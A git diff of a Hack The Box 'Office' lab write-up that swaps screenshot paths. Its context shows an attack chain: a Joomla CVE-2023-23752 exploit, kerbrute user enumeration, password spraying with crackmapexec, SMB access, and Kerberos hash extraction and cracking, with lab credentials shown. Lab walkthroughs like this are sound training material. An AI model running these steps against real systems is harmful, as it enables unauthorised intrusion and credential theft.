@@ -109,19 +109,19 @@ Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:win
 
 Website on port `80`.
 
-![](evidence/screenshots/2024-05-24-11-55-46.png)
+![](./2024-05-24-11-55-46.png)
 
 Results from `nmap` scan show us there's a `robots.txt` file. 
 
-![](evidence/screenshots/2024-05-24-12-02-04.png)
+![](./2024-05-24-12-02-04.png)
 
 We can access the `/administrator` directory which gives us a Joomla login portal.
 
-![](evidence/screenshots/2024-05-24-12-03-23.png)
+![](./2024-05-24-12-03-23.png)
 
 If we look around the directories of the website we find `cassiopeia`. With a bit of Googling we can find an [exploit](https://www.exploit-db.com/exploits/51334).
 
-![](evidence/screenshots/2024-05-24-12-01-24.png)
+![](./2024-05-24-12-01-24.png)
 
 ### CVE 2023-23752
 
@@ -131,7 +131,7 @@ sudo gem install httpx docopt paint
 ruby exploit.rb
 ```
 
-![](evidence/screenshots/2024-05-24-12-17-35.png)
+![](./2024-05-24-12-17-35.png)
 
 We get credentials:
 
@@ -147,13 +147,13 @@ Let's enumerate users on the domain.
 kerbrute userenum --dc dc.office.htb -d office.htb -v -t 150 /usr/share/wordlists/statistically-likely-usernames/jsmith.txt | tee kerbrute.out
 ```
 
-![](evidence/screenshots/2024-05-24-12-23-58.png)
+![](./2024-05-24-12-23-58.png)
 
 ```bash
 cat kerbrute.out | grep + | awk '{print $7}' | cut -d '@' -f 1 | tee users.txt
 ```
 
-![](evidence/screenshots/2024-05-24-12-24-58.png)
+![](./2024-05-24-12-24-58.png)
 
 We can use `crackmapexec` and spray the password we found against all the users enumerated.
 
@@ -161,7 +161,7 @@ We can use `crackmapexec` and spray the password we found against all the users 
 crackmapexec smb office.htb -u users.txt -p 'H0lOgrams4reTakIng0Ver754!' --shares
 ```
 
-![](evidence/screenshots/2024-05-24-12-31-31.png)
+![](./2024-05-24-12-31-31.png)
 
 ```text
 dwolfe:H0lOgrams4reTakIng0Ver754!
@@ -173,13 +173,13 @@ dwolfe:H0lOgrams4reTakIng0Ver754!
 smbclient '//office.htb/SOC Analysis' -U 'OFFICE\dwolfe%H0lOgrams4reTakIng0Ver754!'
 ```
 
-![](evidence/screenshots/2024-05-24-12-35-23.png)
+![](./2024-05-24-12-35-23.png)
 
 We find a `.pcap` file. Let's exfiltrate it and open it up in `Wireshark`.
 
 After looking around and using a few filters, we find some Kerberos authentication action.
 
-![](evidence/screenshots/2024-05-24-12-46-29.png)
+![](./2024-05-24-12-46-29.png)
 
 After doing some [research](https://notes.benheater.com/books/active-directory/page/extracting-kerberos-as-req-pre-auth-hashes-from-pcaps), found a tool we can use to get the hashes from the `.pcap` file.
 
@@ -198,7 +198,7 @@ tshark -F pcap -r Latest-System-Dump-8fbc124d.pcap -w output.pcap
 
 If we look at the `Credential` tab, there's the ticket we found in `Wireshark` previously. You can use the `19900` mode for `hashcat`. 
 
-![](evidence/screenshots/2024-05-24-13-22-04.png)
+![](./2024-05-24-13-22-04.png)
 
 ```text
 tshark:$krb5pa$18$tstark$OFFICE.HTB$$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
@@ -210,7 +210,7 @@ We can use `jtr` to crack the pre-auth ticket.
 john --wordlist=/usr/share/wordlists/rockyou.txt krb5.hash 
 ```
 
-![](evidence/screenshots/2024-05-24-13-27-35.png)
+![](./2024-05-24-13-27-35.png)
 
 ```text
 tshark:playboy69
